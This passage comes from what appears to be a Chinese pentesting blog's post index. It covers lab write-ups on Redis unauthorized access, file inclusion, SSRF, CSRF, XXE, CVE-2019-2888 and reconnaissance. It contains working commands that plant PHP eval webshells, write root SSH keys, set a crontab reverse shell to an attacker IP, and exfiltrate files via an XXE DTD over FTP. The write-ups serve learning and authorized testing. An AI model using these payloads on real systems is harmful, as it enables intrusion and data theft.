总结Oracle数据库注入跟日常的注入其实没有什么太大的分别，需要注意数据类型的一致性和常用表名列名的不同即可，在sql注入的原理上都是拼接sql语句并执行。在实战中企业还是有很大部分使用Oracle数据库，故在此进行分析总结，希望能够对渗透测试人员有所帮助。以上测试靶场采用墨者学院Oracle注入靶场、掌控安全Oralce注入靶场以及本地搭建的Oracle数据库，在实战中可能会遇到waf等安全设备的拦截，后续将针对Oracle数据库waf绕过编写一篇文章，敬请期待ing～","path":"2021/02/02/Oracle数据库注入总结/"},{"title":"通过文件包含拿下服务器","text":"概念文件包含，即包含代码文件。在开发WEB系统的过程中，同样的代码可能要在多个地方使用，例如登录后台之后需要检测用户是否登录，要实现的话需要在每一个后台文件都具有检测登录的代码，这样会导致代码很冗余，耗费了大量的人力物力而且还浪费了服务器资源。在这样的情况下，就开发出了文件包含函数，通过include()、require()、include_once()、require_once()函数，指定对应文件的路径，即可自动加载该文件的代码进行执行。从开发层面来看，文件包含便利了代码的编写，但是如果没有进行很好地检测，就会产生任意文件包含漏洞。 本地文件包含和远程文件包含 文件包含分为本地文件包含和远程文件包含。本地文件包含，LFI，只能包含服务器上的资源；远程文件包含，RFI，可以通过http协议包含互联网上的资源。 开启文件包含功能需要在PHP的配置文件php.ini中进行设置： allow_url_fopen = On/off 表示开启或关闭本地文件包含功能allow_url_include = On/Off 表示开启或关闭远程文件包含功能 远程文件包含因为危害性更大，可以直接加载互联网上的文件，所以一般该功能是处于关闭状态的；而本地文件包含因为需要减轻代码负担，所以一般都是开启的。如图： 文件包含函数文件包含函数有include()、include_once()、require()、require_once()。因为是拼接到代码进行执行，所以被文件包含的文件不论是什么后缀，包含之后都会被当作代码执行。在文件上传中，我们往往写入了一句话木马文件，但是因为白名单，二次渲染，重新更名等措施，使木马文件不能被当作代码执行，所以只是上传到服务器上了。如果服务器还存在文件包含漏洞，可以进行本地文件包含，那么将其包含的路径指定为木马文件，就可以执行了。 文件包含函数之间的区别：include() //如果被包含的文件不存在，网页报错，但是代码会继续执行require() //如果被包含的文件不存在，网页报错，代码不会继续执行include_once()和require_once()本质上与include()和require()差别不大，就是在包含前查看是否已经包含过了，如果包含过一次了就不再继续包含。 产生这样区别的原理是include和require调用文件的方式和时间不同：include - PHP运行到include函数的位置然后去调用被包含的文件。require - PHP在运行前，就先去把被包含的文件的内容提取出来，然后整合成一个新的PHP文件去执行。 漏洞-任意文件包含 如果说单纯是文件包含，那么并不算是漏洞，因为只是包含了相应的代码文件，能够让代码执行的更加快捷，减轻了服务器压力。但是有的时候，因为业务的需要，或者在开发代码的时候为了文件包含的灵活，开发者会将文件包含函数包含的文件路径通过传参来实现。那么，如果我们控制了传参的内容指向我们需要的文件路径，就变成了任意文件包含漏洞，只要那个文件是一个包含了木马的文件，就可以直接获取服务器权限。 实战演示1、打开实例站点，这里看到是通过s参数加载模块回显页面的2、通过源代码审计工具对于站点源代码进行审计。发现在MyAction.class.php文件中通过id传参拼接my_进行加载模块处理。3、定位display函数，发现继续调用了fetch函数。4、继续追踪fetch函数，经分析发现经过了parseTemplateFile函数对其进行了处理，之后直接通过include()进行包含。5、全文追踪找到parseTemplateFile函数，里面检测了模板文件名为空、模板文件名包含@、模板文件名包含：的情况，这些不影响进行文件包含。6、后面发现有个throw分支，需要能够返回变量templateFile，那么就不能进入该分支。定位函数file_exists_case。经分析可以发现这里是对文件名大小写进行判断的，并不影响传入目录进行包含。7、现在漏洞点有了，但是进行包含需要一个含有一句话木马的文件。回到站点，在加载模块处加上任意信息让其报错，可以看到在页面中显示了错误信息提示模块不存在，并且输出了传入的aaaaaa。8、查看日志文件，发现日志文件名是通过固定的年_月_日进行命名的，并且文件内容将完整的错误信息记录了下来。9、接下来就是想办法通过错误信息将一句话木马写入到日志文件。这里先传了常规的一句话，发现错误信息并没有加载该一句话。不要紧，查看日志文件发现，已经成功写入了一句话木马。10、包含该日志文件，成功输出了里面的内容了，但是当我通过传参1执行phpinfo()函数的时候发现页面没有响应。11、查看网页url发现我的输入被网站更改了，变成/0/phpinfo()%3B/，应该是传参1在网站后台有记录，是确实存在的，那么重新传一句话木马，此时设置php的传参为aaa。12、在加载模块处拼接日志文件再通过&amp;传参aaa=phpinfo();，发现页面成功输出了phpinfo的函数内容。13、通过菜刀WEBshell管理工具拿下服务器权限。 14、执行系统命令获取当前用户名以及系统信息。","path":"2020/12/11/通过文件包含拿下服务器/"},{"title":"如何搭建自己的dnslog服务器","text":"Dnslog即dns日志，通过记录访问了的域名或者子域名。在渗透测试过程中，攻击者往往无法直接获取相应的数据，那么就可以通过将数据拼接到dns中，将数据外带出来。 下面介绍如何搭建dnslog服务器首先需要有一个可以修改dns设置的域名以及一个vps推荐通过阿里云购买 域名ajie.xxxxvps：1.1.1.1在服务器中需要进行如下设置1、设置dns修改 2、设置域名解析两个NS记录，一个A记录3、服务器安装go环境wget https://dl.google.com/go/go1.10.3.linux-amd64.tar.gzsudo tar -C /usr/local -xzf go1.10.3.linux-amd64.tar.gzvi /etc/profile末尾添加export PATH=$PATH:/usr/local/go/bin 4、安装dnslog服务器下载地址：https://github.com/lanyi1998/DNSlog-GO/releases/tag/1.2我选择的是linux系统 5、解压获取里面的文件，修改其中的config.iniPort = 8080 //HTTP监听端口Token = ajie //API token，相当于密码ConsoleDisable = false //禁用web控制台，设置为true以后无法访问web页面，只能通过API获取数据 6、开启dnslog服务./main 7、访问8080端口，可以查看dnslog的web页面 8、测试dns解析，成功记录","path":"2020/12/08/如何搭建自己的dnslog服务器/"},{"title":"漏洞复现-Redis未授权访问","text":"Redis概念redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set –有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。 Redis 是一个高性能的key-value数据库。 redis的出现，很大程度补偿了memcached这类key/value存储的不足，在部 分场合可以对关系数据库起到很好的补充作用。它提供了Java，C/C++，C#，PHP，JavaScript，Perl，Object-C，Python，Ruby，Erlang等客户端，使用很方便。 Redis未授权访问redis 默认情况下，会绑定在 0.0.0.0:6379，，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作。 漏洞产生条件 1、 redis服务绑定在6379端口并且该端口可以被访问到2、 没有设置密码认证（一般为空），可以免密码远程登录redis服务。 环境准备靶机：Centos7：192.168.229.157攻击机：Kali：192.168.229.128 环境搭建1、首先下载redis的压缩包 1wget http://download.redis.io/releases/redis-2.8.17.tar.gz 2、解压压缩包，进入指定路径redis-2.8.17，进行安装 123tar xzf redis-2.8.17.tar.gzcd redis-2.8.17make 3、进入到src路径，将redis-server和redis-cli拷贝到/usr/bin目录下，后续方便直接启动redis服务器并且将redis-2.8.17目录下面的redis.conf拷贝到/etc下面。 1234cd srccp redis-server /usr/bincp redis-cli /usr/bincp redis.conf /etc/redis.conf 4、启动服务 1redis-server /etc/redis.conf 漏洞复现写入webshell1、首先尝试无密码连接redis，未报错表示连接成功 1redis-cli -h 192.168.229.157 2、写入webhsell 12345redis-cli -h 192.168.229.157config set dir /home/config set dbfilename 8.phpset webshell &quot;&lt;?php eval($_POST[1]);?&gt;&quot;save 3、在服务器查看文件，确实写入了webshell 利用“公私钥”认证获得root权限1、 kali攻击机未授权访问连接 12redis-cli -h 192.168.163.157keys * 2、在攻击机中生成ssh公钥和私钥，密码设置为空（一路回车即可） 1ssh-keygen -t rsa 3、进入.ssh目录，将生成的公钥保存到1.txt 12cd /root/.ssh(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; 1.txt 4、将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入） 1cat 1.txt | redis-cli -h 192.168.229.157 -x set crack 5、使用 CONFIG GET dir 命令得到redis备份的路径 1CONFIG GET dir 6、更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）,并且修改上传公钥文件的名称为authorized_keys。 1234567config set dir /root/.ssh 这里设置目录时，可能存在(error) ERR Changing directory: No such file or directory 这是因为root从来没有登录过，在被攻击机执行ssh localhost 即可 (error) ERR Changing directory: Permission denied 说明redis并不是以root启动的，在被攻击机重新使用sudo开启redis服务即可CONFIG SET dbfilename authorized_keyssave 查看攻击机也已经成功生成了公钥文件 7、使用ssh免密码登录redis服务器 1ssh -i id_rsa root@192.168.229.157 利用计划任务反弹shell1、首先kali机器进行开启监听 2、使用redis通过crontab进行反弹shell 1234set xxx &quot;\\n\\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.229.128/4455 0&gt;&amp;1\\n\\n&quot;config set dir /var/spool/cronconfig set dbfilename rootsave 3、查看反弹shell命令已经成功写入了 4、攻击机也成功获取了shell","path":"2020/11/29/漏洞复现-Redis未授权访问/"},{"title":"服务器端请求伪造-SSRF","text":"最初认识SSRF会与CSRF跨站请求伪造很容易混淆。二者虽然名字很像，但是实际运用却千差万别。SSRF是构造形成由服务器发起请求，攻击内网主机的漏洞；而CSRF则是构造形成由客户端发起请求，攻击服务器的漏洞。 概念SSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。攻击者往往可以通过SSRF访问到目标服务器所在的内网资源，这些资源是正常用户访问不到的，而且因为SSRF可以支持伪协议，所以还存在直接通过Gopher协议写入webshell的危害。 SSRF的危害 1.内外网的端口和服务扫描2.主机本地敏感数据的读取3.内外网主机应用程序漏洞的利用4.内外网Web站点漏洞的利用 SSRF漏洞可能出现的地方因为SSRF是服务器端请求伪造，那么可以看出，SSRF漏洞出现的位置，肯定是服务器加载资源处。或者说，当服务器有向外加载资源，就有可能存在SSRF漏洞。例如： 1、图片加载/下载：通过URL地址加载或下载图片2、图片/文章收藏功能：从URL地址中取出title以及文本的内容作为显示3、导出功能：从服务器中加载文件进行导出4、在线翻译5、一些api接口提供的加载其他url功能 实战渗透SSRF漏洞1、首先打开指定站点，这里看到打开页面是通过加载模块进行回显的 2、直接通过file伪协议获取文件内容发现显示模块不存在 3、定位存在漏洞的代码文件：app/setting/controller/ApiAdminDomainSettings.php 4、分析代码 1234（1）通过input传参postAddress（2）将postAddress赋予$api（3）$api经过$options处理，最后赋予给$ch（4）执行curl_exec 5、传参获取数据库文件内容，里面获取了用户名root，密码root。 1postAddress=file:///E:\\New File\\WWW\\phpStudy\\WWW\\app\\database.php&amp;url=test&amp;id=test 6、读取php配置文件php.ini","path":"2020/11/28/服务端请求伪造-SSRF/"},{"title":"被忽视的漏洞-CSRF跨站请求伪造","text":"0x01 前言几天前，有位师傅联系我询问CSRF的事，最近也刚好在学习CSRF，就弄出一篇文章出来吧。CSRF在我眼里，真的是被大家低估了的漏洞，配合好社会工程学的话，我觉得在现在大家对于sql注入，xss，文件上传的防护都很重视的情况下，CSRF能够造成意想不到的效果。CSRF简介CSRF（跨站请求伪造），是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。 0x02 Cookie这里需要了解一个概念，cookie，一串字符串，是网站辨别用户的标识，也可以这样理解，拿到了某用户在某网站的cookie，我就可以登录他在那个网站的账号。这里扯一嘴，偷取cookie是XSS做的事，CSRF的作用是借用cookie，并不能获取cookie。 0x03 CSRF原理接下来进行CSRF的讲解，我是这样理解CSRF的，它通过构造一个poc，让已经登录某网站的用户访问，这个poc便会以该用户的cookie来操作网站，对于那个受害者来说，他点击了我的链接，浏览器就偷偷进行了一些操作。 0x04 危害攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。 0x05 检测CSRF漏洞检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。当然也可以像我这样，看看有没有Token字段，没有就先认为存在。（Token是一种防御CSRF的机制，也是目前使用相对较好的防御方法，会在后面进行解释） 通过CSRF 修改受害者的个人信息1.首先打开靶场2.注册一个新用户3.这是注册成功后的界面，可以看到有个用户管理 4.点击我的个人资料，对于我的账号进行一些修改5.通过burp抓取这个修改包，做成CSRF的poc6.这里我将代码存在CSRF.html7.接下来，我们需要社工，诱骗登录了该网站的受害者点击我们的链接，这里因为是演示，就直接拿我的管理员账号来试试了。首先看看我的admin1的账号信息，这里都是admin18.登录了用户后，(也可以关闭该页面，cookie在登录之后是有一定的存在时间的)，在这个浏览器，访问poc的链接9.点击按钮之后，回去看我的账号信息，已经变成了刚刚我做成的poc的内容 这就是简单的CSRF的功能，看着好像危害不大的样子，那么接下来让大家看看，通过CSRF来getshell。 0x06 通过CSRF来getshell1、什么是shell？shell就是一个脚本文件，我们通过这个脚本文件来管理或者控制服务器的文件、数据库等信息。 2、如何getshell？目的是将脚本文件上传到服务器，并让服务器解析。脚本文件可以是asp、php、jsp等。 3、流程1.首先打开我本机上的某cms的后台 2.通过上传一句话木马构造CSRFpoc 3.将poc保存为html文件，这里我进行了一些配置，设置页面为打开直接自动点击。4.到靶机处，登录它的网站，可以看到，这个网站的ip为靶机的，这个网站与我构造poc 的网站不是同一个。5.接下来，通过靶机访问构造好的html6.点击之后，一闪而过了保存文件的界面之后跳出了文件管理器，看到IP知道文件已经保存成功了。还是验证一下吧，回去之前那个页面刷新后发现确实保存成功了7.现在也就是说我已经将木马文件放到对方的服务器上了，接下来回到本机，连接菜刀，拿下服务器 0x07 防御CSRF1.验证 HTTP Referer 字段根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。这种验证方法通过查看referer来验证CSRF攻击的数据包是否是用户自己的操作，当然因为可以伪造referer，所以现在比较没有那么流行。2.Token机制可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。一般为了预防CSRF或者其他攻击，都能够在抓包处发现存在token字段，有的是get传参，有的是post传参。token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，如果token一样，则执行操作，token不一样就不予执行。3.在 HTTP 头中自定义属性并验证 0x08 总结思考CSRF漏洞因为需要受害者点击才能够触发，所以经常不被重视，但是正是这种情况下，CSRF能够造成的危害会比想象中要大。嗯嗯，社会工程学就是高端的欺骗，具体可以百度学习一下。本篇文章就到这里了，对于实验中的环境，工具，有需要的可以添加我的微信获取。","path":"2020/11/09/被忽视的漏洞-CSRF跨站请求伪造/"},{"title":"一次面试引发的XXE学习","text":"文章已发布到公众号：广软NSDA安全团队标题：面试某公司渗透岗引发的XXE学习链接：https://mp.weixin.qq.com/s/5g4BH-1GFgQ8MyuQ2N30GA 前言刚刚进行了某公司渗透岗的面试，经历过多次面试的我发现，面试官很喜欢问XXE漏洞，而这也是很多人所不了解或者了解有限的，这里我希望通过一篇推文，让大家入门XXE漏洞，对于以后的面试甚至工作有所帮助。 XXEXML External Entity 即外部实体，从安全角度理解为XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，可以允许引入外部实体，攻击者通过伪造外部实体而触发漏洞。通俗点就是我们可以控制它解析我们传入的来自外部的实体而造成的漏洞。 XML外部实体注入攻击接下来我将对XML外部实体注入进行拆分解释：1.XML 可扩展标记语言（可以自己发明标签；在HTML中标签已经被预定义好了，可以直接使用）类似HTML设计宗旨为传输数据而非显示数据标签未定义自我描述性W3C标准（总结：XML就是用来存储传输数据的、可以自己发明标签） 2.外部实体：外部的DTD（后面详细介绍什么是DTD部分）3.注入（所有注入都可以这样定义）： 1.用户能够控制输入 2.用户输入的数据被拼接到了原本要执行的代码一起执行 标准的XXE攻击payload XML声明 - 类似PHP的、用来声明此为XML DTD – 可以理解为模板或规则，这里定义了一个标签foo以及通过file伪协议读取了/etc/passwd的内容 XML部分 调用了DTD部分定义的东西来执行，就如HTML中的标签，我们直接引用xxe表示将xxe作为1级标题加大&amp;加粗字体。（只不过在XML中我们需要自己定义标签的含义） 我是这样理解XXE漏洞的：1、 可以传参XML内容2、 XML内容会被放到代码中执行3、 传入恶意的DTD部分，使用SYSTEM与伪协议读取敏感信息或执行其他伪协议操作 从代码层面出发理解XXE：PHP中存在一个函数：simplexml_load_string(‘XML内容’,’SimpleXMLElement’,LIBXML_NOENT)作用是将XML转化为对象 这里写段简单的代码看看效果：1、 在C盘放一个flag.txt文件，内容为this is good flag.2、 写一段PHP代码，通过simplexml_load_string解析XML内容，读取flag.txt的内容并输出附上代码，可以自己尝试，注意需要web环境，可以通过phpstudy快速搭建： 是不是没什么感觉呢，那么我修改代码看看：这里可以看到原来的xml没了，变成了通过读取POST传输的数据，那么我们传参原来的payload，一样可以利用。 XXE无回显现在就要考虑另一个问题了，因为XML是用来存储传输数据的，除了确实是业务需要，否则开发不可能会输出内容，也就是说你确实读取到了文件内容，但是没办法看到，在上面的实验代码中可以通过删除最后的print($b)来实现这样的操作。XXE不回显问题当然也是有解决办法的，不知道大家接触过DNSLOG吗，可以通过咋域名前面放入查询出的内容，将数据通过dns日志记录下来。XXE虽然不是通过DNSlog，但是也同样是外带数据。流程如下：在受害者网站中，我们通过请求攻击者VPS上的1.xml文件，文件内容为将某数据放在GET传参中去访问2.php。然后2.php中的内容为保存GET传参的数据，将数据放入到3.txt中。具体文件内容放在下面，里面的IP地址应该为攻击者的IP地址，这3个文件也是放在攻击者VPS上的。1.xml &lt;!ENTITY% all ““&gt;%all;2.php 3.txt 内容空 实战演示：下面我将以PHPSHE1.7 cms来进行实战讲解1、 首先下载获取源码，在全局中搜索解析xml的函数simplexml_load_string，获取到2个php文件2、 在include/function/global.func.php文件中可以看到，很熟悉的操作，通过php://input获取POST传参的内容，然后进行解析。（json_decode( ) —- json 转 对象/数组）3、 这里因为是在函数pe_getxml中，所以还需要全局搜索看看哪些php文件调用了这个函数4、 第二个明显不是了，那就只能看第一个，点击查看代码5、 又在一个函数中，可以看到这个是接收微信xml数据的，那么我们再全局搜索wechat_getxml函数6、 可以定位到/include/plugin/payment/wechat/notify_url.php文件7、 现在就已经发现了漏洞利用链，首先notify_url.php文件调用了wechat_getxml函数，wechat_getxml函数调用了pe_getxml函数，pe_getxml函数存在XXE漏洞，这里明显没有输出解析后的内容，即XXE无回显，所以我们还需要一台攻击机，在里面放上1.xml、2.php、3.txt8、 内容如下：1.xml","path":"2020/11/05/一次面试引发的XXE学习/"},{"title":"(CVE-2019-2888)weblogic-XXE漏洞复现","text":"本篇文章将带来weblogic的xxe漏洞CVE-2019-2888的漏洞利用方式环境搭建请参考这一篇文章 https://j-jasson2.github.io/2020/09/30/Windows搭建weblogic环境/ 漏洞检测黑盒审计1、端口+服务+版本 2、首先使用在线工具获取一个dnslog地址 3、使用CVE-2019-2888调用外部的我们获取的dnslog地址 4、回去查看日志，已经成功获取了日志，说明这里可能存在CVE-2019-2888漏洞 白盒审计在源码中的\\weblogic\\servlet\\ejb2jsp\\dd\\EJBTaglibDescriptor.class这个类继承自java\\io\\Externalizable如果没有对该类进行disableXXEOnDocumentBuilderFactory处理，即存在CVE-2019-2888 漏洞。 漏洞复现工具：xxer：https://github.com/TheTwitchy/xxerCVE-2019-2888https://github.com/jas502n/CVE-2019-2888 1、首先攻击机下载好工具，打开xxer，开始监听数据 1python xxer.py -p 8989 -H 192.168.159.129 2、打开xxer文件目录下的ext.dtd，输入以下内容，需要修改的地方为读取靶机的内容的路径以及攻击机的ip。 1&lt;!ENTITY % bbb SYSTEM &quot;file:///Windows/&quot;&gt;&lt;!ENTITY % ccc &quot;&lt;!ENTITY &amp;#37; ddd SYSTEM &#x27;ftp://fakeuser:%bbb;@192.168.159.129:2121/b&#x27;&gt;&quot;&gt; 3、新打开一个终端，路径为CVE-2019-2888的文件夹中。运行命令，会让你输入攻击机的IP与端口，我这里分别是192.168.159.129和8989 4、回到之前xxer的监听界面，获取了靶机的/Windows路径下的所有文件信息","path":"2020/10/02/CVE-2019-2888-weblogic-XXE漏洞复现/"},{"title":"如何进行信息收集","text":"网络安全法上面是中国网络安全法第四十一条，因为与这篇推文相对应，所有拿出来用。信息收集的作用很强大，希望大家在学习的同时，注意把握度量！本篇推文仅涉及信息收集教学，如有任何不良情况，请第一时间联系我删除。 前言归结而言，信息搜集，是渗透测试的灵魂。其实在日常生活中我们无时无刻不在进行信息收集。要参加一个比赛，我们会提前了解比赛内容，这就是信息收集；要追求一个女生，我们会通过接触她的闺蜜，了解她的喜好，获取她的微信号、QQ号等，这也是信息收集。在抗战时期，信息收集的重要性就体现出来了，一场战争的输赢，在很大程度上就依赖于信息收集的完整性。敌军的数量有多少、军队部署怎么样等，可以让我们提前针对并部署相应的方案来应对。这也是为什么当时情报部门非常重要的体现了。那么接下来，我将详细介绍在渗透测试中如何进行信息收集。 1.whois信息什么是whois？whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库。在渗透测试中，whois可以很好地收集到目标域名的相应信息，例如注册人的邮箱，姓名，手机号等。进行whois信息收集一般是通过在线工具： 站长之家http://whois.chinaz.com/ 中国万网 https://whois.aliyun.com/ Whois.com https://www.whois.com/个人还是比较喜欢whois.com的，因为站长之家等网站会对一些信息进行隐藏，所以我比较多用其他的。Whois查询网站还有很多很多，可以通过百度whois来获取。 这里还是以站长之家whois 查询sougou.com来举例：可以看到，这里我查询的域名是sougou.com，通过whois，我可以知道注册商，注册人的邮箱，联系电话等信息。在这些信息后面有个whois反查，这个也很重要，whois反查可以查询该联系人或者该邮箱还注册了什么网站。如图为whois反查联系电话的结果，可以看到下面都是该联系电话注册的网站。 2.子域名查询首先介绍一下什么是域名。这里我以微信公众平台的域名举例。如图可以看到，这里的URL的前面的部分是mp.weixin.qq.com。这就是域名。在这里我们可以进行拆分为以下几个域名：1. mp.weixin.qq.com2. weixin.qq.com3. qq.com 最短的那个qq.com便是根域名，也叫一级域名，这种域名所在的网站相对安全，很难对其进行渗透测试。但是根域名可以衍生出很多很多子域名，他们有直接或者间接的联系。也就是说，如果你对一个子域名进行了渗透测试，很可能会间接对根域名所在服务器进行影响，所以我们可以对子域名进行信息查询，进而可以扩大攻击范围，子域名一定是有关联的，很多时候基本上都同属一个公司。查询子域名有以下几种方法：1、通过google语法的site2、通过layer子域名挖掘机3、通过在线网站4、通过burp的爬虫模块 1.google语法的site语法：搜索引擎非常强大，site语法的做用是查询site后面的域名下的所有站点，包括子域名；如图所示，我查询了baidu.com，下面出现的全部都是baidu.com域名下的网站，如site.baidu.com、baike.baidu.com、duer.baidu.com/等。 2.layer子域名挖掘机轻量级的子域名挖掘神器，它的原理是通过对于子域名进行爆破，获取相应的子域名再呈现出来，具体用法很简单，填写主域名、设置端口、选择dns解析的服务器，最后点击启动即可，如图所示，我爆破获取百度的子域名。 3.在线网站站长工具http://tool.chinaz.com/subdomain/ 微步社区https://x.threatbook.cn/微步社区最大的作用是用来查询威胁情报的，查询子域名我并不是很喜欢，比较少用。在线二级域名子域名查询http://tools.bugscaner.com/subdomain/ 4.Burp的Spider模块首先要先捕获到主域名的数据包右键send to Spider在target模块便可以看到很多百度的子域名，而且burp的好处是不仅仅查询子域名，还能够查询到站点地图，这在很大程度上帮助我们了解了网站的具体框架结构，为后续的渗透测试奠定基础。总而言之，收集子域名的方法还有很多，我比较喜欢用的就是layer子域名挖掘机和burp，当然还有很多在线工具可以通过百度子域名获取到。 3.端口扫描Nmap说到端口扫描就马上可以想到kali Linux这个网络安全人员所熟知的系统。在kali系统里面集成了很多渗透测试的工具，其中有一款叫Nmap的工具，可以通过相应语法对目标主机进行端口扫描，得到目标主机的端口开放情况信息。有些危险端口开放了我们就可以尝试入侵，例如445|3306|22|1433|6379 可以尝试爆破或者是使用某些端口存在漏洞的服务。而且有可能一台服务器上面不同端口代表着不同的Web网站。基础命令-p 指定端口扫描-v 显示扫描过程-Pn 跳过主机发现过程直接端口扫描 [目标禁ping时使用]-O 探测主机操作系统-A 全面扫描，包括一切探测，由于动静太大而且时间问题不怎么使用 端口扫描状态Opend 端口开放Closed 端口关闭Filtered 端口被过滤 在线网站站长之家(因为要防止恶意攻击，所以只能单个端口测试)https://tool.chinaz.com/port/PostJson在线端口检测http://coolaf.com/tool/port 4.目录扫描目录是什么，目录就是一个网站的骨架，正如我们平时访问一个网站，先是进入了主目录，或者说访问了index.php/index.html等index文件，但是我们不知道目标网站还有哪些目录文件是我们可以访问的，所以就需要进行目录扫描了。下面介绍如何进行目录扫描。 御剑目录扫描工具御剑是一款能够通过字典对目标域名进行轮询访问，检测http状态码的软件，如果得到200回应就记录下来，也就得到了我们需要的目录信息。这里随便扫了一个靶场，可以看到网站目录除了index.php之外还有一个robosts文件。robots.txt是一个基本上在每个网站中都会放置的文件，里面会标明了哪些目录可以爬取，哪些不可以爬取，当然这往往只是君子协议，真的爬取了也是无法拦截的。渗透测试过程中往往可以通过访问robots文件查看一些敏感目录。 5.C段C段，即IP地址的C段地址，如192.168.1.0/24。在渗透测试过程中，一个公司可能由于业务原因，会购买多个公网IP，那么为了方便，这些IP往往是相连的，甚至该公司会直接将那个公网IP的一个C段买下来。也就是说，测试站点所处的IP地址的C段，很可能也是该公司的资产，在渗透测试过程中可以通过迂回战术，先拿下C段的该公司的其他站点，再来对主站点进行渗透测试。 要获取C段就涉及了一个内容——CDN，内容分发网络，是为了负载均衡，内容分发等而创建的一个智能虚拟网络。对于一些大公司来说，他的业务可能会有非常多以至于全世界都有人访问，那么一台服务器是不足以完成那么大的工作量的，这时候就需要购买CDN了，对于不同区域的用户分发不同的IP地址，里面存储了需要访问的资源，能够很大程度上减轻服务器的压力。 有了CDN的存在也就是说，我们通过ping域名的方式获取的IP地址不一定是真实IP地址，所以我们就需要绕过CDN来获取真实IP地址进而获取C段。 下面介绍如何判断是否有CDN以及如何获取真实IP。 判断是否有CDN有一个在线工具叫多地点Ping，可以通过不同地点ping域名的对应IP是否相同来判断有没有CDN服务。https://www.ping.cn/ping/这里我测试的是baidu.com，很明显不同地区的IP不同，所以存在CDN。 绕过CDN获取真实IP1、 子域名查询子域名与主域名同一服务器CDN挂在主域名上，但是不一定挂在子域名上 2、邮件服务器从邮件服务器请求邮件，邮件中可以获取真实IP 3、国外地址请求（国外ping）4、遗留文件，扫描全网例如通过phpinfo.php文件中获取IP地址全网ping，从CDN中筛选真实IP 5、fofa、shodan、zoomeye搜索特定文件/信息6、dns历史记录查询未使用cdn之前留下的真实IP记录 6.旁站旁站，即同IP不同站点。旁站一般都是和目标站点在同一个内网或者是同一台服务器。在渗透测试过程中为了加大攻击面，往往还会获取目标的旁站，从旁站入手进行渗透测试。下面介绍如何获取旁站，一般都是通过在线工具获取。 站长工具http://stool.chinaz.com/same The Web of WebScan https://www.webscan.cc/ 7.指纹识别 指纹识别，也就是通过指纹信息判断当前系统的环境配置、使用的CMS等。说到指纹我们都不陌生了，手机就有指纹解锁。我们可以通过指纹信息判断一个人的身份，是否为当前手机的机主。渗透测试中的指纹识别也差不多，通过识别目标网站是否使用CMS模板搭建，使用了什么框架等，可以让我们能够针对性的对其进行渗透。 CMS，内容管理系统。即一套web系统的模板，我们可以通过CMS快速搭建一个网站，这种模板的代码一般开源，在网上也有很多旧版本的漏洞。通过识别是什么CMS，我们就可以搜索该CMS的历史漏洞，即Nday，测试是否有修复。 指纹识别一般通过下面几种在线工具进行识别。 Whatweb在线指纹识别http://whatweb.bugscaner.com/如图我们成功判断出该站点的cms为dedecms，那么就可以通过dedecms的历史漏洞进行渗透测试。 微步社区（tips:只输入域名即可，不需要加上http://）https://x.threatbook.cn/微步社区不怎么用，还是以查询威胁情报为主的，这里看到可以查询到域名解析、子域名、whois等信息。 云溪指纹（需要邀请码，需要注册，还挺麻烦的）https://www.yunsee.cn/可以看到云溪指纹查询的信息就很全面，然后还提供了查看漏洞功能，所以个人是很喜欢使用云溪指纹识别的。 8. 内容敏感信息泄露 （google hacking）Google搜索引擎Google是一款十分强大的搜索引擎，黑客们常常借助它搜索网站的一些敏感目录和文件，甚至可以利用它的搜索功能来自动攻击那些有漏洞的网站；而有些人可以通过搜索把某个个人的信息，包括住址、电话号码、出生年月等都可以搜索出来；当然我们在日常的生活中正确的借助Google搜索也可以更加高效的找到我们需要的东西。也就是说我们通过谷歌搜索引擎，加上google语法，能够收集到一些敏感信息。 Google镜像站我们都知道，国内是无法访问google搜索引擎的，虽然其他搜索引擎也是可以使用google语法的，但是会过滤掉一些信息，用起来很不方便，所以还是推荐使用谷歌。有一款工具叫谷歌镜像站，是国人搭建的类似google搜索引擎的网站，可以达到类似google的效果。谷歌镜像站可以通过百度获得。 Google语法1.sitesite:edu.cn //搜索该域名下的所有站点，包括子域名2.inurl搜索域名中与关键字匹配的页面常用的有inurl:php?id= //查询域名中带有php?id=的页面inurl:admin.php //查询域名中带有admin.php的页面，多用于查询后台3.intitle搜索网页中的标题内容与关键字匹配的页面intitle:后台管理 //查询网页标题含有后台管理的页面4.intext搜索网页内容与关键字匹配的页面intext:dedecms 